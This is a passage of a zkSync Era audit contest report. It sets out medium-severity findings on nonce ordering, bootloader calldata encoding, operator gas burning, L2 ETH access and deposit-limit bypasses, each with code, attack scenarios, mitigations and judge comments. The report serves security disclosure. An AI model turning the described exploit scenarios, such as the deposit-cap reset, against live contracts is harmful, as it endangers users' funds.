                mstore(4, from)
                mstore(36, nonce)
                mstore(68, shouldNonceBeUsed)

                let success := call(
                    gas(),
                    NONCE_HOLDER_ADDR(),
                    0,
                    0,
                    100,
                    0,
                    0
                )

                if iszero(success) {
                    revertWithReason(
                        ACCOUNT_TX_VALIDATION_ERR_CODE(),
                        1
                    )
                }
            }

    function validateNonceUsage(address _address, uint256 _key, bool _shouldBeUsed) external view {
        bool isUsed = isNonceUsed(_address, _key);

        if (isUsed && !_shouldBeUsed) {
            revert("Reusing the same nonce twice");
        } else if (!isUsed && _shouldBeUsed) {
            revert("The nonce was not set as used");
        }
    }

    function isNonceUsed(address _address, uint256 _nonce) public view returns (bool) {
        uint256 addressAsKey = uint256(uint160(_address));
        return (_nonce < getMinNonce(_address) || nonceValues[addressAsKey][_nonce] > 0);
    }

The bootloader calls `validateNonceUsage` too, which considers the arbitrary ordering.

We need to prevent default account from changing nonce ordering type; otherwise, these two methods will conflict. If user's current `minNonce` is 13, nonce of new tx also needs to be 13, but if some value is already stored under 14, `isNonceUsed` will return true. Which means the user will no longer be able to initiate new transactions.

    function _execute(Transaction calldata _transaction) internal {
        address to = address(uint160(_transaction.to));
        uint128 value = Utils.safeCastToU128(_transaction.value);
        bytes calldata data = _transaction.data;
        uint32 gas = Utils.safeCastToU32(gasleft());

        // Note, that the deployment method from the deployer contract can only be called with a "systemCall" flag.
        bool isSystemCall;
        if (to == address(DEPLOYER_SYSTEM_CONTRACT) && data.length >= 4) {
            bytes4 selector = bytes4(data[:4]);
            // Check that called function is the deployment method,
            // the others deployer method is not supposed to be called from the default account.
            isSystemCall =
                selector == DEPLOYER_SYSTEM_CONTRACT.create.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.create2.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.createAccount.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.create2Account.selector;
        }

Flag `isSystemCall` is only set true when calling deployment method of ContractDeployer, so if user tries to call function `updateNonceOrdering` of ContractDeployer, `isSystemCall` will be false and the call will fail.

            function msgValueSimulatorMimicCall(to, from, value, dataPtr) -> success {
                // Only calls to the deployer system contract are allowed to be system
                let isSystem := eq(to, CONTRACT_DEPLOYER_ADDR())

                success := mimicCallOnlyResult(
                    MSG_VALUE_SIMULATOR_ADDR(),
                    from, 
                    dataPtr,
                    0,
                    1,
                    value,
                    to,
                    isSystem
                )
            }

However, if the transaction is initiated on L1, selector is not checked. Flag `isSystem` is set true as long as the target is ContractDeployer. The transaction to `updateNonceOrdering` will succeed.

    function updateNonceOrdering(AccountNonceOrdering _nonceOrdering) external onlySystemCall {
        AccountInfo memory currentInfo = accountInfo[msg.sender];

        require(
            _nonceOrdering == AccountNonceOrdering.Arbitrary &&
                currentInfo.nonceOrdering == AccountNonceOrdering.Sequential,
            "It is only possible to change from sequential to arbitrary ordering"
        );

        currentInfo.nonceOrdering = _nonceOrdering;
        _storeAccountInfo(msg.sender, currentInfo);

        emit AccountNonceOrderingUpdated(msg.sender, _nonceOrdering);
    }

Once updated, the change is permanent. The account can no longer initiate any new transactions.

### Recommended Mitigation Steps

Don't allow EOA to call `updateNonceOrdering`. Do the check on L1 side.

### Assessed type

Context

**[miladpiri (zkSync) confirmed, but disagreed with severity](https://github.com/code-423n4/2023-10-zksync-findings/issues/861#issuecomment-1833352913)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/861#issuecomment-1887432458):**
 > A dispute regarding usage of future code was made, which is rational. Personally, I believe that being able to access the `isSystem` flag could be precursor to higher impact findings and that for this reason the finding warrants medium severity.
> 
> I understand that as of now, the system is safe; however, this broken invariant could be a root cause for drastic issues in the future if zkSync Era functionality is further expanded.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/861).*

***

## [[M-07] Wrong encoding of the data in the `sendCompressedBytecode` function](https://github.com/code-423n4/2023-10-zksync-findings/issues/807)
*Submitted by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/807)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1244-L1245><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1255-L1259><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1365><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1542><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/scripts/process.ts#L123><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L54-L82>

### Description

There is enforcement in the `bootloader::sendCompressedBytecode` function that the data to be used for the call of the `Compressor::publishCompressedBytecode` function is encoded in a standard way.

But this check contains bugs:
1. There is no check that the `originalBytecodeOffset` is equal to `afterSelectorPtr + 64`. This leads to the possibility of passing a great number of unused bytes as calldata of the call of the `Compressor::publishCompressedBytecode` function. In this case, the calldata will have the following format:

```
4                               bytes : `publishCompressedBytecode` selector
32                              bytes : offset for `_bytecode` parameter                                                  = V
32                              bytes : offset for `_rawCompressedData` parameter                                         = V + 32 + rounded_len(_bytecode)
(V - 64)                        bytes : any bytes that will be ignored in the `publishCompressedBytecode` function
32                              bytes : length of `_bytecode` parameter                                                   = len(_bytecode)
rounded_len(_bytecode)          bytes : `_bytecode` parameter                                                             = _bytecode 
32                              bytes : length of `_rawCompressedData` parameter                                          = len(_rawCompressedData)
rounded_len(_rawCompressedData) bytes : `_rawCompressedData` parameter                                                    = _rawCompressedData
```

2. There are used unsafe "raw" arithmetic operations in the calculations of the offsets, while the `safe` analogs should be used. This leads to the possibility of passing absolutely wrong data so the call of the `Compressor::publishCompressedBytecode` function will revert. As this bug does not provide any strong attack vector, I will present only the idea of how to achieve this, not the whole calldata. The offset of the `_bytecode` parameter should be equal `(2**256) - 64` (so the `originalBytecodeOffset` will pass the `checkOffset` check), rest of the parameters is easy to determine over this. The same happens in the `bootloader::validateBytes` function, as in the `bootloader::lengthRoundedByWords` function the overflow happens, leading to the same outcome.

### Impact

The ability of the operator to pass up to `~COMPRESSED_BYTECODES_SLOTS * 32 = ~1048576` additional bytes into the call of the `Compressor::publishCompressedBytecode` function. Such possibility of spending **part of the transaction gas limit** makes the operator able to actually decrease the L2 transaction gas limit, which leads to the possibility of manipulation of the amount of gas used for the transaction execution.

The ability of the operator to pass encoding-related checks of the `bootloader::sendCompressedBytecode` function, which leads to the possibility of forcing the `Compressor::publishCompressedBytecode` function call to revert.

### Recommended Mitigation Steps

1. You can add the following check into the `bootloader::sendCompressedBytecode` function:

```solidity
if iszero(eq(add(afterSelectorPtr, 64), originalBytecodeOffset)) {
    assertionError("Compression calldata incorrect")
}
```

2. You can use `safeAdd` instead of `add` in the corresponding calculations in the `bootloader::sendCompressedBytecode` function.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/807#issuecomment-1845074348):**
 > The Warden has demonstrated how unsafe arithmetic could be used by the operator to pass incorrect data that "checks" down to the expected values. This could be used to pass incorrect compressed data as well as abuse gas costs as means to cause end users to be overcharged.

**[vladbochok (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/807#issuecomment-1845074348)**

***

## [[M-08] Burning of the user gas in the `sendCompressedBytecode` function](https://github.com/code-423n4/2023-10-zksync-findings/issues/805)
*Submitted by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/805)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1244-L1245><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1255-L1259><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1365>

### Description

In the `bootloader::sendCompressedBytecode` function the `nearCallPanic()` is used for [the case of unsuccessfull call of the `Compressor::publishCompressedBytecode` function](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1573-L1579). In practice, such situation could happen because of invalid data provided by the operator, as any of the internal checks of this function could be ignored by the operator to make the call to revert: decoding of the `_rawCompressedData` ([link](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L208-L209)), the checks on `dictionary` length ([link1](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L61), [link2](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L62)), the check on the `encodedData` length ([link](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L63-L66)), etc.

Such possibility of forcing the overall `bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2` to [near call revert](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1573-L1579), makes the operator able to burn all the gas of the L2 transaction if there is at least one bytecode to be published at the start of transaction processing.

### Impact

The ability of the operator to burn all the gas of the L2 transaction in the call of the `bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2` function, if at least one bytecode is to be published.

### Recommended Mitigation Steps

Use `revertWithReason` instead of `nearCallPanic` for the cases of unsuccessful calls of the `Compressor::publishCompressedBytecode` function. The cases of `out of gas error` on such calls operator can process as standard bytecode publications through the `bootloader::markFactoryDepsForTx` functionality.

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/805#issuecomment-1795728505):**
 > This has medium severity because it gives the operator the ability to forcefully fail the transaction.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/805#issuecomment-1829782380):**
 > The finding is similar to [#71](https://github.com/code-423n4/2023-10-zksync-findings/issues/71); however, in this case it shows how the Operator can break trust expectations by purposefully making tx fails via OOG.

***

## [[M-09] Lack of access to ETH on L2 through ``L1->L2`` transactions](https://github.com/code-423n4/2023-10-zksync-findings/issues/803)
*Submitted by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/803)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L318><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L305-L306><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L2321><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L2328-L2333>

### Description

ETH on L2 stored on EOAs is inaccessible through ``L1->L2`` transactions, as for such transactions `msg.value` is generated only "from L1 ETH", not from the active balance of the `tx.origin` on L2. This is because of [the logic in the `Malibox::_requestL2Transaction` function](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L305-L306), which enforces `msg.value` of the ``L1->L2`` transaction to be only part of [ETH to be minted inside of transaction processing on L2](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L323). [Bootloader maintains this system invariant](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1656-L1659) as well.

`DefaultAccount` incorrectly [assumes](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L124-L125) that ``L1->L2`` transactions initiated by EOA cover the needed functionality of the `executeTransactionFromOutside` function, so it is empty.

Users will be unable to access their ETH on L2 in the case of a malicious operator that ignores L2 transactions (so if it processes only ``L1->L2`` transactions). Also, and importantly, this violates the security invariant that enforces the ability of the users to access L2 through ``L1->L2`` transactions, and, therefore, withdraw funds from the rollup before the upgrade in case of a scheduled malicious upgrade.

### Impact

No access to ETH on L2 that is controlled by EOAs in case of malicious operator.

Violation of the "guarantee of withdraw of funds before malicious upgrade execution" security invariant.

### Recommended Mitigation Steps

Add a possibility to create ``L1->L2`` transactions that can use ETH from the L2 balance as part of the `msg.value`. As an alternative, you can implement the `DefaultAccount::executeTransactionFromOutside` function so it will contain the expected behavior, as [stated in the comment above its declaration](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L122-L129).


**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1794613549):**
 > Warden states that if an EOA has some fund on L2, he can not withdraw it by requesting a tx from L1. The only way is to make a tx on L2. But, if the operator is malicious and only process L1-to-L2 txs, not L2 txs, then user’s fund will be trapped. 
> 
> The scenario requires a malicious operator ignoring L2 txs. The main issue is that it is not possible to withdraw the fund of an account on L2 through L1 -> L2 transaction. Medium is fair.

**[Barichek (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1838409561):**
 > @Alex the Entreprenerd @vladbochok - The main point of the described finding is about the violation of one of the main zkSync rollup invariants. Namely, the invariant mentioned in the finding is the "ability of the users to access L2 through `L1->L2` transactions, and, therefore, withdraw funds from the rollup before the upgrade in case of a scheduled malicious upgrade".
> 
> This invariant should be maintained in the system design, as `L1->L2` txs are currently the only one legal way to enforce the ability of the user to access his funds in case of the malicious operator. Therefore, it is a critical point that is the only difference between the current zkSync design and the sidechain with transitions proved by zkp.
> 
> Otherwise, it wouldn't make sense to publish state diffs using on-chain calldata: such data will be required to reconstruct the rollup state and force/process transactions in case of the malicious operator, but in case the operator can ignore L2 transactions and there is no access to ETH on L2 through `L1->L2` txs there is no protection against the malicious operator. This confirms that the described vulnerability is no less serious than the "ability of the operator to not publish some of the rollup state diffs" or the "ability of the operator to ignore `L1->L2` transactions (in the long-term system design with escape hatch)" (both of which are high-severity findings).
> 
> Along with the facts that most of TVL of zkSync is native ETH ([link1](https://l2beat.com/scaling/projects/zksync-era#contracts), [link2](https://etherscan.io/address/0x32400084C286CF3E17e7B677ea9583e60a000324)), and custom wallets are not widely adopted on zkSync, most of the value locked in the zkSync fit the described situation.

**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1838596925):**
 > I can confirm that this is a valid submission. That being said by @Barichek, the problem is censorship resistance protection, so user can't escape funds from the rollup using `L1->L2` communication. 

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/803#issuecomment-1849041173):**
 > The Warden has shown how due to a lack of implementation of `executeTransactionFromOutside` a malicious operator could prevent any withdrawal by denying L2 txs.
> 
> Because of the specific scoping this is valid. Because of the reliance on a malicious operator, Medium Severity seems the most appropriate.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/803).*
***

## [[M-10] Version hash is not correctly enforced in code unpacker](https://github.com/code-423n4/2023-10-zksync-findings/issues/716)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/716), also found by [0xsanson](https://github.com/code-423n4/2023-10-zksync-findings/issues/1134)*

In code unpacker, version hash is not correctly enforced.

### Proof of Concept

In code unpacker, we enforce that version hash is correct.

        let version_hash_matches = UInt16::equals(cs, &chunks[1], &versioned_hash_top_16_bits);
        state.state_get_from_queue.conditionally_enforce_true(cs, version_hash_matches);

The second line means, if version hash matches, `state_get_from_queue` must be true. But this is not what we want. The logic should be if we are getting from queue, version hash must match. Otherwise, even if version hash is incorrect, this line passes as no constraint is actually enforced.

Let's take a closer look at fn `conditionally_enforce_true`, bool `should_enforce` is the third parameter.

    pub fn conditionally_enforce_true<CS: ConstraintSystem<F>>(
        &self,
        cs: &mut CS,
        should_enforce: Self,
    ) {
        // this is equal to having !self && should_enforce == false;
        // so (1 - self) * should_enforce == 0

        if cs.gate_is_allowed::<FmaGateInBaseFieldWithoutConstant<F>>() {
            let zero_var = cs.allocate_constant(F::ZERO);

            let gate = FmaGateInBaseFieldWithoutConstant {
                params: FmaGateInBaseWithoutConstantParams {
                    coeff_for_quadtaric_part: F::MINUS_ONE,
                    linear_term_coeff: F::ONE,
                },
                quadratic_part: (self.variable, should_enforce.variable),
                linear_part: should_enforce.variable,
                rhs_part: zero_var,
            };

            gate.add_to_cs(cs);
        } else {
            unimplemented!()
        }
    }

### Recommended Mitigation Steps

`version_hash_matches.conditionally_enforce_true(cs, state.state_get_from_queue);`

### Assessed type

Context

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/716#issuecomment-1795311015)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/716#issuecomment-1826877465):**
 > The Warden has shown how, due to a constant enforcement on version hashes, future hash versions would fail the check.

***

## [[M-11] Vulnerabilities in Deposit Limit Enforcement and the Impact on Failed Deposits](https://github.com/code-423n4/2023-10-zksync-findings/issues/425)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/425), also found by [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/1144), hals ([1](https://github.com/code-423n4/2023-10-zksync-findings/issues/1143), [2](https://github.com/code-423n4/2023-10-zksync-findings/issues/440)), [Koolex](https://github.com/code-423n4/2023-10-zksync-findings/issues/1031), [cccz](https://github.com/code-423n4/2023-10-zksync-findings/issues/902), [AkshaySrivastav](https://github.com/code-423n4/2023-10-zksync-findings/issues/762), [bin2chen](https://github.com/code-423n4/2023-10-zksync-findings/issues/746), [0xsomeone](https://github.com/code-423n4/2023-10-zksync-findings/issues/736), [Aymen0909](https://github.com/code-423n4/2023-10-zksync-findings/issues/723), [brgltd](https://github.com/code-423n4/2023-10-zksync-findings/issues/659), [shealtielanz](https://github.com/code-423n4/2023-10-zksync-findings/issues/610), [zzzitron](https://github.com/code-423n4/2023-10-zksync-findings/issues/591), [peanuts](https://github.com/code-423n4/2023-10-zksync-findings/issues/486), [Mohandes](https://github.com/code-423n4/2023-10-zksync-findings/issues/482), [tsvetanovv](https://github.com/code-423n4/2023-10-zksync-findings/issues/319), [J4de](https://github.com/code-423n4/2023-10-zksync-findings/issues/317), [ladboy233](https://github.com/code-423n4/2023-10-zksync-findings/issues/211), and [max10afternoon](https://github.com/code-423n4/2023-10-zksync-findings/issues/124)*

1. **Users Failed Deposits:** If a token has no deposit limitation initially and a user's deposit transaction fails, they may not be able to claim their failed deposits later if a deposit limit is imposed on that token.

2. **Deposit Limit Bypass:** Malicious users can exploit the deposit limit system by making failed deposits before the deposit limit is introduced. By claiming these failed deposits, they can reset their total deposited amount, allowing them to exceed the deposit cap once it is enforced.

### Proof of Concept

When depositing an ERC20 token into the `L1ERC20Bridge`, the `_verifyDepositLimit` function plays a pivotal role. This function's primary purpose is to ascertain whether there is a predefined deposit limit in place for the given token and, if such a cap exists, to determine if the user's cumulative deposit amount surpasses this imposed restriction. The user's total deposited amount is meticulously tracked and maintained using the `totalDepositedAmountPerUser` mapping.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L188><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L348>

This same mechanism is applied when a user seeks to reclaim their failed deposit. In this scenario, the `claimFailedDeposit` function is invoked, which once again triggers the `_verifyDepositLimit` function. However, in this context, the objective is to adjust the `totalDepositedAmountPerUser` mapping by decreasing the total deposited amount due to the claiming failed transaction.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L278><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L345>

This implementation can give rise to significant issues, which can be illustrated through the following scenarios:

**Scenario 1:** Suppose there's no deposit limitation imposed on tokenX, indicated by `limitData.depositLimitation = false`. Alice (an honest user) initiates a deposit of 100 tokenX. However, these deposits unfortunately fail. At a later point, the owner decides to enforce a deposit limit on this token by employing the `setDepositLimit` function within the `AllowList` contract. Now, Alice seeks to claim her previously failed deposits. However, when the `_verifyDepositLimit` function is invoked during this process, the if-condition is met. Yet, the issue arises when the amount 100 is going to be deducted from `totalDepositedAmountPerUser[tokenX][Alice]` (which equals 0). This results in an underflow, causing the transaction to revert. So, Alice can not claim her failed deposit in this scenario.

In summary, if there was no deposit limit set for a token initially, and users experienced failed deposit transactions for that token, they encounter difficulties in claiming those failed deposits when a deposit limit is subsequently enforced.

**Scenario 2:** Consider a scenario in which there's no deposit limitation for tokenY initially. However, Bob (a malicious user) monitors the owner's transaction that is going to set a deposit limit for tokenY, specifying `tokenDeposit[tokenY].depositCap = 100`. Immediately, Bob deposits 100 tokenY three times, a total of 300 tokenY, deliberately ensuring that these transactions fail on L2 due to a low `_l2TxGasLimit`. Subsequently, the owner's transaction to establish a deposit limit of 100 for tokenY is executed. Now, Bob decides to deposit another 100 tokenY, resulting in `totalDepositedAmountPerUser[tokenY][Bob]` being set to 100.

However, Bob intends to deposit another 100 tokenY. As the condition `require(totalDepositedAmountPerUser[_l1Token][_depositor] + _amount <= limitData.depositCap, "d1");` is examined, this requirement stipulates that `totalDepositedAmountPerUser[tokenY][Bob] + 100` must not exceed the deposit cap of 100. Bob's attempt to deposit an additional 100 tokenY is therefore denied.

Nonetheless, Bob realizes he can exploit a potential vulnerability. He decides to claim one of his three failed transactions that occurred prior to the deposit cap set up. As a result, `totalDepositedAmountPerUser[tokenY][Bob]` decreases by 100, effectively resetting it to 0. Now Bob can once again deposit 100 tokenY, despite having previously reached the imposed deposit limit. Bob continues this process, claiming his failed deposits after each attempt, thus resetting `totalDepositedAmountPerUser[tokenY][Bob]` and allowing him to deposit 400 tokenY, exceeding the deposit limit of 100.

In summary, this implementation opens the door for malicious users to circumvent deposit limits by arranging failed deposits prior to the imposition of such limits. Subsequently, by claiming these failed deposits, they can effectively increase their deposit limit by resetting `totalDepositedAmountPerUser`.

### Recommended Mitigation Steps

The function `_verifyDepositLimit` should be revised such that it tracks the deposited amount of users even if there is no deposit limitation in place.

    function _verifyDepositLimit(address _l1Token, address _depositor, uint256 _amount, bool _claiming) internal {
            IAllowList.Deposit memory limitData = IAllowList(allowList).getTokenDepositLimitData(_l1Token);

            if (_claiming) {
                totalDepositedAmountPerUser[_l1Token][_depositor] -= _amount;
            } else {
                totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;
    	    if(limitData.depositLimitation){
                   require(totalDepositedAmountPerUser[_l1Token][_depositor] <= limitData.depositCap, "d1");
                }	
            }
        }

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L275>

### Assessed type

Context

**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/425#issuecomment-1794512366):**
 > This is an issue if we switch the deposit limitation feature on/off. But, this is not going to happen as the deposit limitation is only active temporarily during alpha version, later it will be deactivated (removed fully). So, medium severity is fair.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/425#issuecomment-1826049260):**
 > Primary because, while other findings have a Coded POC, this one captures an additional risk.

***

## [[M-12] Timestamp Constraints Leading to Number of Blocks Creation Limitations](https://github.com/code-423n4/2023-10-zksync-findings/issues/316)
*Submitted by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/316)*

The timestamp constraints and batch creation limitations in zkSync have several significant impacts on the platform's functionality and operations:

1. **Limited Block Inclusion:** The constraints on timestamp differences between batches and their respective blocks restrict the number of blocks that can be included in each batch. This leads to smaller batch sizes, making it challenging to efficiently process transactions and utilize the available block space.

2. **Responsiveness Issue:** Due to these constraints, if two batches are intended to be committed on L1 at the same time (in the same Ethereum block), it's not allowed. This can create bottlenecks during batch commitments, especially when zkSync experiences high transaction volumes leading to an increased number of pending transactions and potentially longer finality times, affecting zkSync's overall responsiveness.

3. **Operator-Induced Limitations:** These constraints can be exploited by the operator by setting timestamps much further in the future to intentionally limit the number of blocks in batches. This could lead to various operational issues and inefficiencies.

### Proof of Concept

Upon initiating transaction processing in the bootloader, the first step involves creating a new batch using the `setNewBatch` function in the `SystemContext` contract.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3675><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L416>

This operation enforces that the timestamp of the new batch must be greater than the timestamp of the previous batch and the timestamp of the last block in the previous batch.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L423><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/SystemContext.sol#L402>

Subsequently, when processing a specific transaction, an L2 block is designated by invoking the `setL2Block` function within the `SystemContext` contract. This action ensures that the timestamp of the block is not lower than the timestamp of the current batch.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L559><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L323>

Once the processing of all transactions is completed, an additional fictive block is generated, serving as the final block within the batch. 

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3812>

Finally, the timestamp data is disclosed to L1 for verification.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3816>

On the L1 side, during batch commitment, the `_verifyBatchTimestamp` function is called to confirm the accuracy of the timestamps. It enforces that the batch's timestamp is later than the previous batch and not less than `block.timestamp - COMMIT_TIMESTAMP_NOT_OLDER`. Additionally, it ensures that the timestamp of the last block in this batch is not greater than `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L85><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L93><br>
<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>

A critical concern arises when the operator, during the creation of a new batch on L2, sets its timestamp in close proximity to the value `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`. To illustrate this point, consider the following example:

Imagine a new batch, numbered 1000, is created with a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1`. This batch includes a block with a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1` and a fictive block with a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`. Importantly, these values adhere to all the timestamp requirements outlined in the `SystemContext` contract, as explained earlier.

When this batch 1000, is committed on L1 at a specific time `blockTimestamp1000` (meaning the time at which the batch 1000 is committed on L1), during timestamp verification, the following requirement is met (assuming `X <= blockTimestamp1000`):

    require(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, "h2");

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>

Because:

    assuming: X <= blockTimestamp1000 ==>
    X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA <= blockTimestamp1000 + COMMIT_TIMESTAMP_APPROXIMATION_DELTA

This results in a successful proof and execution of the batch 1000. Now, when a new batch, 1001, is to be created on L2, its timestamp must be higher than `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA` because a batch's timestamp should surpass the timestamp of the last block in the previous batch.

Suppose the timestamp of batch 1001 is `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`, and the last block within this batch carries a timestamp of `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K`.

To summarize:
- Batch 1000:
    - Batch timestamp: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1`.
    - Timestamp of the last block (fictive block) in this batch: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`.
    - The time this batch is committed on L1: `blockTimestamp1000`.
    - `X <= blockTimestamp1000`.

- Batch 1001:
    - Batch timestamp: `X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y`.
